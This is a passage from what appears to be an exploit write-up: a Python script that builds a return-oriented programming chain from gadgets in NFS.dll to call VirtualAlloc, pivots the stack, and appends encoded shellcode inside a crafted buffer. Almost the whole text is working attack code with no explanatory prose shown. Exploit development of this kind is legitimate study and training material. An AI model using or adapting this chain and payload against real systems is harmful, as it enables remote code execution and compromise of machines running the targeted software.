rop += pack("<L", (0x10011b04)) # inc eax ; ret  ;  

# We copy EAX to ESI
rop += pack("<L", (0x5021809b)) # push eax ; pop esi ; pop ebp ; ret  ; 
rop += pack("<L", (0x42424242)) # pop ebp

rop += pack("<L", (0x50218139)) # push eax ; pop ebp ; ret  ;  (1 found)

#increase EAX 0x20 x 14 
rop += pack("<L", (0x10011521)) # +--    NFS.dll.txt:3743:0x10011521: add eax, 0x20 ; pop ebx ; ret  ;  (1 found)
rop += pack("<L", (0x42424242)) # pop ebx
rop += pack("<L", (0x10011521)) # +--    NFS.dll.txt:3743:0x10011521: add eax, 0x20 ; pop ebx ; ret  ;  (1 found)
rop += pack("<L", (0x42424242)) # pop ebx
rop += pack("<L", (0x10011521)) # +--    NFS.dll.txt:3743:0x10011521: add eax, 0x20 ; pop ebx ; ret  ;  (1 found)
rop += pack("<L", (0x42424242)) # pop ebx
rop += pack("<L", (0x10011521)) # +--    NFS.dll.txt:3743:0x10011521: add eax, 0x20 ; pop ebx ; ret  ;  (1 found)
rop += pack("<L", (0x42424242)) # pop ebx
rop += pack("<L", (0x10011521)) # +--    NFS.dll.txt:3743:0x10011521: add eax, 0x20 ; pop ebx ; ret  ;  (1 found)
rop += pack("<L", (0x42424242)) # pop ebx
rop += pack("<L", (0x10011521)) # +--    NFS.dll.txt:3743:0x10011521: add eax, 0x20 ; pop ebx ; ret  ;  (1 found)
rop += pack("<L", (0x42424242)) # pop ebx
rop += pack("<L", (0x10011521)) # +--    NFS.dll.txt:3743:0x10011521: add eax, 0x20 ; pop ebx ; ret  ;  (1 found)
rop += pack("<L", (0x42424242)) # pop ebx
rop += pack("<L", (0x10011521)) # +--    NFS.dll.txt:3743:0x10011521: add eax, 0x20 ; pop ebx ; ret  ;  (1 found)
rop += pack("<L", (0x42424242)) # pop ebx
rop += pack("<L", (0x10011521)) # +--    NFS.dll.txt:3743:0x10011521: add eax, 0x20 ; pop ebx ; ret  ;  (1 found)
rop += pack("<L", (0x42424242)) # pop ebx
rop += pack("<L", (0x10011521)) # +--    NFS.dll.txt:3743:0x10011521: add eax, 0x20 ; pop ebx ; ret  ;  (1 found)
rop += pack("<L", (0x42424242)) # pop ebx
rop += pack("<L", (0x10011521)) # +--    NFS.dll.txt:3743:0x10011521: add eax, 0x20 ; pop ebx ; ret  ;  (1 found)
rop += pack("<L", (0x42424242)) # pop ebx
rop += pack("<L", (0x10011521)) # +--    NFS.dll.txt:3743:0x10011521: add eax, 0x20 ; pop ebx ; ret  ;  (1 found)
rop += pack("<L", (0x42424242)) # pop ebx
rop += pack("<L", (0x10011521)) # +--    NFS.dll.txt:3743:0x10011521: add eax, 0x20 ; pop ebx ; ret  ;  (1 found)
rop += pack("<L", (0x42424242)) # pop ebx
rop += pack("<L", (0x10011521)) # +--    NFS.dll.txt:3743:0x10011521: add eax, 0x20 ; pop ebx ; ret  ;  (1 found)
rop += pack("<L", (0x42424242)) # pop ebx

# write eax into location pointed by ESI
rop += pack("<L", (0x1001bfe5)) # NFS.dll.txt:9702:0x1001bfe5: mov dword [esi], eax ; mov dword [esi+0x08], eax ; mov dword [esi+0x04], eax ; pop esi ; ret  ;
rop += pack("<L", (0x42424242)) # pop esi

### dwsize
rop += pack("<L", (0x10014429)) # pop eax ; ret  ;
rop += pack("<L", (0xffffffff)) # -1 value that is negated
rop += pack("<L", (0x10015a25)) # NFS.dll.txt:10993:0x10015a25: neg eax ; pop edi ; pop esi ; ret  ;  (1 found)
rop += pack("<L", (0x42424242)) # pop edi
rop += pack("<L", (0x42424242)) # pop esi

#copy eax to ecx
rop += pack("<L", (0x502162b5)) # push eax ; and al, 0x59 ; pop ecx ; ret  ;  (1 found)

#EAX will need valid memory address for the next gadget so we just add the virtualloc address
rop += pack("<L", (0x5021376f)) # pop eax ; ret  ;
rop += pack("<L", (0x100252E0)) # VirtualAlloc Address

#restore eax from ebp
rop += pack("<L", (0x10019c61)) # ROPS\SNFS.dll.txt:14698:0x10019c61: push ebp ; add edx, dword [eax] ; pop eax ; ret  

#readjust the eax value to align
rop += pack("<L", (0x10011b04)) # inc eax ; ret  ;  
rop += pack("<L", (0x10011b04)) # inc eax ; ret  ;  
rop += pack("<L", (0x10011b04)) # inc eax ; ret  ;  
rop += pack("<L", (0x10011b04)) # inc eax ; ret  ;
rop += pack("<L", (0x10011b04)) # inc eax ; ret  ;  
rop += pack("<L", (0x10011b04)) # inc eax ; ret  ;  
rop += pack("<L", (0x10011b04)) # inc eax ; ret  ;  
rop += pack("<L", (0x10011b04)) # inc eax ; ret  ;
rop += pack("<L", (0x1001526c)) # mov dword [eax], ecx ; ret  ;

###flAllocationType
rop += pack("<L", (0x10011b04)) # inc eax ; ret  ;  
rop += pack("<L", (0x10011b04)) # inc eax ; ret  ;  
rop += pack("<L", (0x10011b04)) # inc eax ; ret  ;  
rop += pack("<L", (0x10011b04)) # inc eax ; ret  ;
rop += pack("<L", (0x50218139)) # push eax ; pop ebp ; ret  ; 
rop += pack("<L", (0x10014429)) # pop eax ; ret  ;
rop += pack("<L", (0x80808080)) # first value to be added
rop += pack("<L", (0x10022a64)) # pop ecx ; ret  ;
rop += pack("<L", (0x7f7f8f80)) # second value to be added
rop += pack("<L", (0x10012ef4)) # add eax, ecx ; pop esi ; ret  ;
rop += pack("<L", (0x42424242)) # pop esi
rop += pack("<L", (0x502162b5)) # push eax ; and al, 0x59 ; pop ecx ; ret  ; 

#EAX will need valid memory address for the next gadget so we just add the virtualloc address
rop += pack("<L", (0x5021376f)) # pop eax ; ret  ;
rop += pack("<L", (0x100252e0)) # VirtualAlloc Address

#restore eax from ebp
rop += pack("<L", (0x10019c61)) # push ebp ; add edx, dword [eax] ; pop eax ; ret
rop += pack("<L", (0x1001526c)) # mov dword [eax], ecx ; ret  ;

###flProtect
rop += pack("<L", (0x10011b04)) # inc eax ; ret  ;  
rop += pack("<L", (0x10011b04)) # inc eax ; ret  ;  
rop += pack("<L", (0x10011b04)) # inc eax ; ret  ;  
rop += pack("<L", (0x10011b04)) # inc eax ; ret  ;
rop += pack("<L", (0x50218139)) # push eax ; pop ebp ; ret  ; 
rop += pack("<L", (0x10014429)) # pop eax ; ret  ;
rop += pack("<L", (0x80808080)) # first value to be added
rop += pack("<L", (0x10022a64)) # pop ecx ; ret  ;
rop += pack("<L", (0x7f7f7fc0)) # second value to be added
rop += pack("<L", (0x10012ef4)) # add eax, ecx ; pop esi ; ret  ;
rop += pack("<L", (0x42424242)) # pop esi
rop += pack("<L", (0x502162b5)) # push eax ; and al, 0x59 ; pop ecx ; ret  ; 

#EAX will need valid memory address for the next gadget so we just add the virtualloc address
rop += pack("<L", (0x5021376f)) # pop eax ; ret  ;
rop += pack("<L", (0x100252e0)) # VirtualAlloc Address

#restore eax from ebp
rop += pack("<L", (0x10019c61)) # push ebp ; add edx, dword [eax] ; pop eax ; ret
rop += pack("<L", (0x1001526c)) # mov dword [eax], ecx ; ret  ;

########### EXECUTE VIRTUAL ALLOC
rop += pack("<L", (0x10022a64)) # pop ecx ; ret  ;
rop += pack("<L", (0xffffffe8)) # negative offset value
rop += pack("<L", (0x10012ef4)) # add eax, ecx ; pop esi ; ret  ;
rop += pack("<L", (0x42424242)) # pop esi
rop += pack("<L", (0x50218139)) # push eax ; pop ebp ; ret  ;
rop += pack("<L", (0x1001a555)) # mov esp, ebp ; pop ebp ; ret  ;

shellcode =  b""
shellcode += b"\xba\x5d\x46\x9e\x1d\xdb\xd6\xd9\x74\x24\xf4"
shellcode += b"\x5e\x33\xc9\xb1\x5e\x31\x56\x14\x83\xc6\x04"
shellcode += b"\x03\x56\x10\xbf\xb3\x17\xf8\xbe\xf8\xd8\xfa"
shellcode += b"\x3f\xff\x28\x34\xdb\x8b\x3a\xf6\xa8\xfa\xb0"
shellcode += b"\x7d\xd8\x1e\x42\xdf\x2c\x94\x2a\xc0\xa7\x9c"
shellcode += b"\xb4\x39\xf8\xf8\x4d\xc8\xed\xff\xf3\xa5\x84"
shellcode += b"\xfb\xe0\xe2\x8e\xf1\x08\xf5\xb1\x9a\x7d\x49"
shellcode += b"\x71\xd0\xfe\x4d\xf1\xe7\x21\xda\x4e\xf0\x56"
shellcode += b"\x9a\x70\x01\xb1\xac\x35\xfd\xa2\x99\xfc\x76"
shellcode += b"\x61\x1a\x75\xbc\xe2\xe3\x57\x8c\x32\x7a\x9b"
shellcode += b"\x43\x36\xbd\x17\x9b\xf6\xf4\xda\xa2\x3a\xe3"
shellcode += b"\x10\x9f\xee\xd0\xfc\x95\xd1\x92\xab\x71\xef"
shellcode += b"\x7e\x35\xf1\xe3\x34\x32\x52\xe0\xc9\x9e\xd6"
shellcode += b"\x1c\x40\x1f\x31\x95\x10\x3b\xdd\xc7\x5b\x2b"
shellcode += b"\x5e\xbe\xe9\xd3\x9f\x94\x15\xaa\x25\x07\x7e"
shellcode += b"\x22\xeb\x29\x92\xc5\xa1\x31\xe3\x7c\x5e\x52"
shellcode += b"\x81\x80\xed\xb4\x9a\x29\x16\x30\x21\xc9\x27"
shellcode += b"\x82\xcc\x51\x2b\x6e\x41\xc9\x87\x5c\x4f\x6d"
shellcode += b"\x80\xd7\xfc\x5f\x0f\x4c\xfc\xca\xbb\xe5\xc1"
shellcode += b"\x9c\x08\x18\x39\x67\x70\xb6\xc6\x1e\xcb\x25"
shellcode += b"\xaf\xf9\xdd\xa0\x82\x06\x88\x4e\x54\xbd\x13"
shellcode += b"\x27\x6a\x87\x79\x04\x8d\xa2\x85\xe3\x37\x68"
shellcode += b"\x0f\x13\x86\xb9\x69\x6d\x79\x3c\x5f\x45\x2a"
shellcode += b"\x0f\x5f\x33\x73\x6d\x5d\xec\x7c\x24\x7d\x3d"
shellcode += b"\x43\x96\x2d\x6d\xf3\x10\x9e\xa1\xf6\x4c\x5e"
shellcode += b"\xea\x07\x39\x7e\x83\x3e\xf0\xbe\xc3\xee\x9a"
shellcode += b"\xfe\x4c\x04\xb4\x99\x34\x06\x24\xa7\xa5\x29"
shellcode += b"\xd2\xa4\xe6\x48\x4a\xff\xb9\x7d\xaa\xaf\x15"
shellcode += b"\x2e\x7a\x54\x86\x9e\x2d\x02\x59\x4b\xf5\xfc"
shellcode += b"\xf3\x22\xc4\xc0\xac\x9a\x96\x41\x7d\xd2\x67"
shellcode += b"\xc1\x7f\x2c\xd7\xf3\xbf\xfc\x87\xa3\x6f\xad"
shellcode += b"\x77\x14\xc0\x1d\x27\x24\xa4\xcd\x93\x1b\x9d"
shellcode += b"\x75\x9c\x3e\x22\x7e\x7a\x6e\xb5\xe2\x17\xeb"
shellcode += b"\x6b\xb1\xbc\x7a\x93\x08\x8b\x1b\xed\xfb\x08"
shellcode += b"\xcd\xc5\xac\x59\x3c\x16\x1c\x35\x6e\xd6\xcd"
shellcode += b"\xfd\xde\x86\xbe\xad\x21\x73\x59\x7c\x17\x2d"
shellcode += b"\x33\x81\x58\x9b\xd3"

formatString = b"File: %s From: %d To: %d ChunkLoc: %d FileLoc: %d" % (offset + va + eip + rop + shellcode ,0,0,0,0)
buf += formatString
```
</details>
